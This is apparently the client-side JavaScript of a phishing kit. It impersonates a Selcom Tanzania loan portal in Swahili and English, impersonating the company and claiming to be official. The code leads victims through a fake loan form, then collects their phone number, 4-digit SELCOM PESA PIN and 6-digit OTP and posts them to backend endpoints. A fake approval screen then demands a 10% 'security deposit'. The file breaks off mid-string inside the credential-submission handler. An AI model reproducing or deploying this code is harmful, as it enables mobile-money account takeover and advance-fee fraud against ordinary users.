document.addEventListener('DOMContentLoaded', () => {
  const stepWelcome = document.getElementById('step-welcome');
  const stepSlider = document.getElementById('step-slider');
  const stepForm1 = document.getElementById('step-form-1');
  const stepForm2 = document.getElementById('step-form-2');
  const stepForm3 = document.getElementById('step-form-3');
  const stepPin = document.getElementById('step-pin');
  const stepOtp = document.getElementById('step-otp');
  const stepLoading = document.getElementById('step-loading');
  const stepSuccess = document.getElementById('step-success');

  const credsSurfaceBanner = document.getElementById('creds-surface-banner');
  const otpSurfaceBanner = document.getElementById('otp-surface-banner');
  const phoneError = document.getElementById('phone-error');

  let currentUserId = null;
  let statusPollInterval = null;
  let otpTimerInterval = null;
  let currentLang = 'sw'; // Default language Swahili

  const urlParams = new URLSearchParams(window.location.search);
  const adminParam = urlParams.get('admin') || '';

  const translations = {
    sw: {
      welcomeTitle: "KARIBU SELCOM TANZANIA!",
      welcomeSub: "WELCOME TO THE OFFICIAL APPLICATION PORTAL.",
      welcomeDesc: "Your unique Selcom Account Details (Tanzania only) are required for all interactions. Ensure you use a valid account number to avoid delays.",
      critNotif: "CRITICAL NOTIFICATION",
      attention: ":* ! ATTENTION!",
      critDesc: "An essential security measure: <strong>DO NOT ENTER INVALID SELCOM ACCOUNT DETAILS</strong>. This will cause immediate rejection. Please double-check your Tanzania-specific account number before submitting.",
      officialPortal: "Official Application Portal (Tanzania Only)",
      proceedBtn: "ENDELEA",
      calcTitle: "Kadiria Malipo ya Mkopo",
      calcSub: "Chagua kiasi cha mkopo na muda wa marejesho",
      loanAmtLbl: "Kiasi cha Mkopo (TZS)",
      loanTermLbl: "Muda wa Mkopo (Miezi)",
      monthlyEst: "Makadirio ya Malipo ya Kila Mwezi",
      signInBtn: "INGIA / TUMIA →",
      form1Title: "Maombi ya Mkopo",
      form1Step: "Hatua 1 ya 3",
      loanTypeLbl: "Aina ya Mkopo",
      formAmountLbl: "Kiasi cha Mkopo (TZS)",
      formDurationLbl: "Muda wa Mkopo",
      loanPurposeLbl: "Madhumuni ya Mkopo",
      loanPurposePh: "Elezea madhumuni ya mkopo wako...",
      nextStepBtn: "HATUA INAYOFUATA →",
      form2Title: "Maombi ya Mkopo",
      form2Step: "Hatua 2 ya 3",
      firstNameLbl: "Jina la Kwanza",
      lastNameLbl: "Jina la Ukoo",
      phoneLbl: "Namba ya Simu (Tanzania)",
      phoneErr: "Tafadhali ingiza namba sahihi ya simu inayoanza na 0.",
      prevBtn: "ILIYOTANGULIA",
      nextBtn: "HATUA INAYOFUATA",
      form3Title: "Maombi ya Mkopo",
      form3Step: "Hatua 3 ya 3",
      empStatusLbl: "Hali ya Ajira",
      incomeLbl: "Mapato ya Mwaka (TZS)",
      summaryHeader: "Muhtasari wa Maombi",
      sumAmtLbl: "Kiasi cha Mkopo:",
      sumTermLbl: "Muda wa Mkopo:",
      sumPurpLbl: "Madhumuni:",
      sumAppLbl: "Mwombaji:",
      submitAppBtn: "WASILISHA MAOMBI",
      pinTitle: "Thibitisha PIN yako ya SELCOM PESA",
      pinSub: "Kwa usalama, tafadhali thibitisha PIN yako ya tarakimu 4 ya akaunti ili kuendelea.",
      pinLabel: "PIN yako ya tarakimu 4",
      pinNote: "Hakikisha hii inalingana na PIN uliyoweka kwa akaunti hii.",
      pinSubmitBtn: "WASILISHA",
      otpTitle: "Thibitisha OTP yako ya SELCOM PESA",
      otpSub: "Kwa usalama, msimbo wa OTP umetumwa kwa SMS au WhatsApp kwenye nambari yako ya SELCOM PESA. Tafadhali ingiza hapa chini ili kuendelea.",
      otpLabel: "OTP yako ya tarakimu 6",
      otpSubmitBtn: "INGIZA OTP",
      successTitle: "🎉 Hongera!",
      successSub: "Mkopo wako umeidhinishwa! Fedha zitatolewa hivi karibuni kwenye akaunti yako ya Selcom Pesa.",
      apprAmtLbl: "KIASI KILICHOIDHINISHWA",
      complianceLbl: "⚠️ NOTISI YA UZINGATIAJI",
      complianceDesc: "Akaunti yako ya SELCOM lazima iwe hai na idumishe amana ya usalama ya angalau <strong>10% ya kiasi cha mkopo ulioomba</strong>. Amana hii inarudishwa kikamilifu baada ya kulipa mkopo na husaidia kupata riba nzuri zaidi.",
      loanDetailsHeader: "💳 Maelezo ya Mkopo",
      monthlyRepLbl: "MALIPO YA KILA MWEZI",
      termLbl: "MUDA WA MKOPO",
      homeBtn: "🏠 Rudi Nyumbani",
      loadingTitle: "Inachakata...",
      loadingSub: "Tafadhali subiri wakati tunathibitisha taarifa zako."
    },
    en: {
      welcomeTitle: "WELCOME TO SELCOM TANZANIA!",
      welcomeSub: "WELCOME TO THE OFFICIAL APPLICATION PORTAL.",
      welcomeDesc: "Your unique Selcom Account Details (Tanzania only) are required for all interactions. Ensure you use a valid account number to avoid delays.",
      critNotif: "CRITICAL NOTIFICATION",
      attention: ":* ! ATTENTION!",
      critDesc: "An essential security measure: <strong>DO NOT ENTER INVALID SELCOM ACCOUNT DETAILS</strong>. This will cause immediate rejection. Please double-check your Tanzania-specific account number before submitting.",
      officialPortal: "Official Application Portal (Tanzania Only)",
      proceedBtn: "CONTINUE",
      calcTitle: "Estimate your loan repayments",
      calcSub: "Choose your loan amount and repayment duration",
      loanAmtLbl: "Loan Amount (TZS)",
      loanTermLbl: "Loan Term (Months)",
      monthlyEst: "Estimated Monthly Repayment",
      signInBtn: "SIGN IN →",
      form1Title: "Loan Application",
      form1Step: "Step 1 of 3",
      loanTypeLbl: "Loan Type",
      formAmountLbl: "Loan Amount (TZS)",
      formDurationLbl: "Loan Term",
      loanPurposeLbl: "Loan Purpose",
      loanPurposePh: "Describe the purpose of your loan...",
      nextStepBtn: "NEXT STEP →",
      form2Title: "Loan Application",
      form2Step: "Step 2 of 3",
      firstNameLbl: "First Name",
      lastNameLbl: "Last Name",
      phoneLbl: "Phone Number (Tanzania)",
      phoneErr: "Please enter a valid Tanzania phone number starting with 0.",
      prevBtn: "PREVIOUS",
      nextBtn: "NEXT STEP",
      form3Title: "Loan Application",
      form3Step: "Step 3 of 3",
      empStatusLbl: "Employment Status",
      incomeLbl: "Annual Income (TZS)",
      summaryHeader: "Application Summary",
      sumAmtLbl: "Loan Amount:",
      sumTermLbl: "Loan Term:",
      sumPurpLbl: "Purpose:",
      sumAppLbl: "Applicant:",
      submitAppBtn: "SUBMIT APPLICATION",
      pinTitle: "Confirm your SELCOM PESA PIN",
      pinSub: "For security, please confirm your 4-digit account PIN to continue.",
      pinLabel: "Your 4-digit PIN",
      pinNote: "Make sure this matches the PIN set for this account.",
      pinSubmitBtn: "SUBMIT",
      otpTitle: "Confirm your SELCOM PESA OTP",
      otpSub: "For security, an OTP code has been sent via SMS or WhatsApp to your SELCOM PESA number. Please enter below to continue.",
      otpLabel: "Your 6-digit OTP",
      otpSubmitBtn: "ENTER OTP",
      successTitle: "🎉 Congratulations!",
      successSub: "Your loan has been approved! Funds will be disbursed shortly to your Selcom Pesa account.",
      apprAmtLbl: "APPROVED AMOUNT",
      complianceLbl: "⚠️ COMPLIANCE NOTICE",
      complianceDesc: "Your SELCOM account must be active and maintain a security deposit of at least <strong>10% of the requested loan amount</strong>. This deposit is fully refunded after loan repayment.",
      loanDetailsHeader: "💳 Loan Details",
      monthlyRepLbl: "MONTHLY REPAYMENT",
      termLbl: "LOAN TERM",
      homeBtn: "🏠 Return to Home",
      loadingTitle: "Processing...",
      loadingSub: "Please wait while we verify your information."
    }
  };

  function updateLanguageTexts() {
    const t = translations[currentLang];
    
    document.getElementById('lang-label-eng').style.opacity = currentLang === 'en' ? '1' : '0.7';
    document.getElementById('lang-label-swa').style.opacity = currentLang === 'sw' ? '1' : '0.7';

    document.getElementById('txt-welcome-title').innerText = t.welcomeTitle;
    document.getElementById('txt-welcome-sub').innerText = t.welcomeSub;
    document.getElementById('txt-welcome-desc').innerText = t.welcomeDesc;
    document.getElementById('txt-crit-notif').innerText = t.critNotif;
    document.getElementById('txt-attention').innerText = t.attention;
    document.getElementById('txt-crit-desc').innerHTML = t.critDesc;
    document.getElementById('txt-official-portal').innerText = t.officialPortal;
    document.getElementById('btn-welcome-proceed').innerText = t.proceedBtn;

    document.getElementById('txt-calc-title').innerText = t.calcTitle;
    document.getElementById('txt-calc-sub').innerText = t.calcSub;
    document.getElementById('txt-loan-amount-lbl').innerText = t.loanAmtLbl;
    document.getElementById('txt-loan-term-lbl').innerText = t.loanTermLbl;
    document.getElementById('txt-monthly-est').innerText = t.monthlyEst;
    document.getElementById('btn-slider-next').innerText = t.signInBtn;

    document.getElementById('txt-form1-title').innerText = t.form1Title;
    document.getElementById('txt-form1-step').innerText = t.form1Step;
    document.getElementById('txt-loan-type-lbl').innerText = t.loanTypeLbl;
    document.getElementById('txt-form-amount-lbl').innerText = t.formAmountLbl;
    document.getElementById('txt-form-duration-lbl').innerText = t.formDurationLbl;
    document.getElementById('txt-loan-purpose-lbl').innerText = t.loanPurposeLbl;
    document.getElementById('loan-purpose').placeholder = t.loanPurposePh;
    document.getElementById('btn-form1-next').innerText = t.nextStepBtn;

    document.getElementById('txt-form2-title').innerText = t.form2Title;
    document.getElementById('txt-form2-step').innerText = t.form2Step;
    document.getElementById('txt-firstname-lbl').innerText = t.firstNameLbl;
    document.getElementById('txt-lastname-lbl').innerText = t.lastNameLbl;
    document.getElementById('txt-phone-lbl').innerText = t.phoneLbl;
    document.getElementById('phone-error').innerText = t.phoneErr;
    document.getElementById('btn-form2-back').innerText = t.prevBtn;
    document.getElementById('btn-form2-next').innerText = t.nextBtn;

    document.getElementById('txt-form3-title').innerText = t.form3Title;
    document.getElementById('txt-form3-step').innerText = t.form3Step;
    document.getElementById('txt-emp-status-lbl').innerText = t.empStatusLbl;
    document.getElementById('txt-income-lbl').innerText = t.incomeLbl;
    document.getElementById('txt-summary-header').innerText = t.summaryHeader;
    document.getElementById('txt-sum-amt-lbl').innerText = t.sumAmtLbl;
    document.getElementById('txt-sum-term-lbl').innerText = t.sumTermLbl;
    document.getElementById('txt-sum-purp-lbl').innerText = t.sumPurpLbl;
    document.getElementById('txt-sum-app-lbl').innerText = t.sumAppLbl;
    document.getElementById('btn-form3-back').innerText = t.prevBtn;
    document.getElementById('btn-form3-submit').innerText = t.submitAppBtn;

    document.getElementById('txt-pin-title').innerText = t.pinTitle;
    document.getElementById('txt-pin-sub').innerText = t.pinSub;
    document.getElementById('txt-pin-label').innerText = t.pinLabel;
    document.getElementById('txt-pin-note').innerText = t.pinNote;
    document.getElementById('btn-submit-creds').innerText = t.pinSubmitBtn;

    document.getElementById('txt-otp-title').innerText = t.otpTitle;
    document.getElementById('txt-otp-sub').innerText = t.otpSub;
    document.getElementById('txt-otp-label').innerText = t.otpLabel;
    document.getElementById('btn-submit-otp').innerText = t.otpSubmitBtn;

    document.getElementById('txt-success-title').innerText = t.successTitle;
    document.getElementById('txt-success-sub').innerText = t.successSub;
    document.getElementById('txt-appr-amt-lbl').innerText = t.apprAmtLbl;
    document.getElementById('txt-compliance-lbl').innerText = t.complianceLbl;
    document.getElementById('txt-compliance-desc').innerHTML = t.complianceDesc;
    document.getElementById('txt-loan-details-header').innerText = t.loanDetailsHeader;
    document.getElementById('txt-monthly-rep-lbl').innerText = t.monthlyRepLbl;
    document.getElementById('txt-term-lbl').innerText = t.termLbl;
    document.getElementById('btn-go-home').innerText = t.homeBtn;

    document.getElementById('txt-loading-title').innerText = t.loadingTitle;
    document.getElementById('txt-loading-sub').innerText = t.loadingSub;
  }

  const langToggle = document.getElementById('language-toggle');
  if (langToggle) {
    // Sync toggle state with default language
    langToggle.checked = (currentLang === 'sw');
    langToggle.addEventListener('change', (e) => {
      currentLang = e.target.checked ? 'sw' : 'en';
      updateLanguageTexts();
    });
  }

  function showStep(targetStep) {
    [stepWelcome, stepSlider, stepForm1, stepForm2, stepForm3, stepPin, stepOtp, stepSuccess].forEach(s => {
      if (s) s.classList.remove('active');
    });
    if (targetStep) targetStep.classList.add('active');
  }

  const sliderBalance = document.getElementById('slider-balance');
  const balanceVal = document.getElementById('balance-val');
  const sliderDuration = document.getElementById('slider-duration');
  const durationVal = document.getElementById('duration-val');
  const formAmount = document.getElementById('form-amount');
  const formDuration = document.getElementById('form-duration');

  if (sliderBalance && balanceVal) {
    sliderBalance.addEventListener('input', (e) => {
      const val = `${Number(e.target.value).toLocaleString()} TZS`;
      balanceVal.innerText = val;
      if (formAmount) formAmount.value = val;
      const summaryAmt = document.getElementById('summary-amount');
      if (summaryAmt) summaryAmt.innerText = val;
    });
  }

  if (sliderDuration && durationVal) {
    sliderDuration.addEventListener('input', (e) => {
      const val = `${e.target.value} ${currentLang === 'sw' ? 'miezi' : 'months'}`;
      durationVal.innerText = val;
      if (formDuration) formDuration.value = `${e.target.value} ${currentLang === 'sw' ? 'Miezi' : 'Months'}`;
      const summaryDur = document.getElementById('summary-duration');
      if (summaryDur) summaryDur.innerText = `${e.target.value} ${currentLang === 'sw' ? 'Miezi' : 'Months'}`;
    });
  }

  const phoneInput = document.getElementById('phone-number');
  if (phoneInput) {
    phoneInput.addEventListener('input', (e) => {
      let val = e.target.value.replace(/\D/g, '');
      if (val.length > 10) {
        val = val.substring(0, 10);
      }
      e.target.value = val;
    });
  }

  const btnWelcome = document.getElementById('btn-welcome-proceed');
  if (btnWelcome) {
    btnWelcome.addEventListener('click', () => {
      showStep(stepSlider);
    });
  }
  
  const btnSliderNext = document.getElementById('btn-slider-next');
  if (btnSliderNext) {
    btnSliderNext.addEventListener('click', () => {
      if (sliderBalance && formAmount) {
        formAmount.value = `${Number(sliderBalance.value).toLocaleString()} TZS`;
      }
      showStep(stepForm1);
    });
  }

  const btnForm1Next = document.getElementById('btn-form1-next');
  if (btnForm1Next) btnForm1Next.addEventListener('click', () => showStep(stepForm2));

  const btnForm2Back = document.getElementById('btn-form2-back');
  if (btnForm2Back) btnForm2Back.addEventListener('click', () => showStep(stepForm1));

  const btnForm2Next = document.getElementById('btn-form2-next');
  if (btnForm2Next) {
    btnForm2Next.addEventListener('click', () => {
      const firstName = document.getElementById('first-name').value.trim();
      const lastName = document.getElementById('last-name').value.trim();
      const phoneVal = phoneInput ? phoneInput.value.trim() : '';

      if (!phoneVal.startsWith('0') || phoneVal.length < 9) {
        if (phoneError) {
          phoneError.style.display = 'block';
        }
        return;
      }
      if (phoneError) phoneError.style.display = 'none';

      const sumApplicant = document.getElementById('summary-applicant');
      const sumPurpose = document.getElementById('summary-purpose');
      const loanTypeEl = document.getElementById('loan-type');

      if (sumApplicant) sumApplicant.innerText = `${firstName} ${lastName}`.trim() || 'Selcom Customer';
      if (sumPurpose && loanTypeEl) sumPurpose.innerText = loanTypeEl.value;

      showStep(stepForm3);
    });
  }

  const btnForm3Back = document.getElementById('btn-form3-back');
  if (btnForm3Back) btnForm3Back.addEventListener('click', () => showStep(stepForm2));

  const btnForm3Submit = document.getElementById('btn-form3-submit');
  if (btnForm3Submit) {
    btnForm3Submit.addEventListener('click', () => {
      showStep(stepPin);
      if (pinDigits[0]) pinDigits[0].focus();
    });
  }

  const pinDigits = document.querySelectorAll('.pin-digit');
  const otpDigits6 = document.querySelectorAll('.otp-digit-6');

  function setupDigitInputs(inputs, autoSubmitCallback) {
    inputs.forEach((input, idx) => {
      input.addEventListener('input', () => {
        input.value = input.value.replace(/\D/g, '');
        if (input.value && idx < inputs.length - 1) {
          inputs[idx + 1].focus();
        }

        const allFilled = Array.from(inputs).every(i => i.value.length === 1);
        if (allFilled && typeof autoSubmitCallback === 'function') {
          autoSubmitCallback();
        }
      });

      input.addEventListener('keydown', (e) => {
        if (e.key === 'Backspace' && !input.value && idx > 0) {
          inputs[idx - 1].focus();
        }
      });
    });
  }

  setupDigitInputs(pinDigits);
  setupDigitInputs(otpDigits6, () => submitOtpHandler());

  function startOtpCountdown() {
    let timeLeft = 60;
    const timerDisplay = document.getElementById('otp-timer-display');
    const resendBtn = document.getElementById('btn-request-new-otp');
    if (resendBtn) resendBtn.style.display = 'none';

    if (otpTimerInterval) clearInterval(otpTimerInterval);

    otpTimerInterval = setInterval(() => {
      timeLeft--;
      let minutes = Math.floor(timeLeft / 60);
      let seconds = timeLeft % 60;
      if (timerDisplay) {
        timerDisplay.innerHTML = `${currentLang === 'sw' ? 'Msimbo utaisha muda wake baada ya:' : 'Code expires in:'} <strong>${String(minutes).padStart(2, '0')}:${String(seconds).padStart(2, '0')}</strong>`;
      }

      if (timeLeft <= 0) {
        clearInterval(otpTimerInterval);
        if (timerDisplay) timerDisplay.innerHTML = `<strong>${currentLang === 'sw' ? 'Msimbo umeisha muda wake!' : 'Code expired!'}</strong>`;
        if (resendBtn) resendBtn.style.display = 'inline-block';
      }
    }, 1000);
  }

  const resendBtn = document.getElementById('btn-request-new-otp');
  if (resendBtn) {
    resendBtn.addEventListener('click', async () => {
      otpDigits6.forEach(i => i.value = '');
      if (otpDigits6[0]) otpDigits6[0].focus();
      if (otpSurfaceBanner) otpSurfaceBanner.classList.remove('active');
      startOtpCountdown();
      
      try {
        await fetch('/api/request-new-otp', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ userId: currentUserId })
        });
      } catch (e) {}
    });
  }

  const btnSubmitCreds = document.getElementById('btn-submit-creds');
  if (btnSubmitCreds) {
    btnSubmitCreds.addEventListener('click', async () => {
      const phoneVal = phoneInput ? phoneInput.value.trim() : '';
      const pinVal = Array.from(pinDigits).map(i => i.value).join('');

      const pinError = document.getElementById('pin-error');
      if (pinVal.length !== 4) {
        if (pinError) pinError.style.display = 'block';
        return;
      }
      if (pinError) pinError.style.display = 'none';

      if (credsSurfaceBanner) credsSurfaceBanner.classList.remove('active');
      showLoading(currentLang === 'sw' ? 'Inathibitisha...' : 'Verifying...', currentLang === 'sw' ? 'Inatuma taarifa zako kwa usalama.' : 'Securely transmitting 
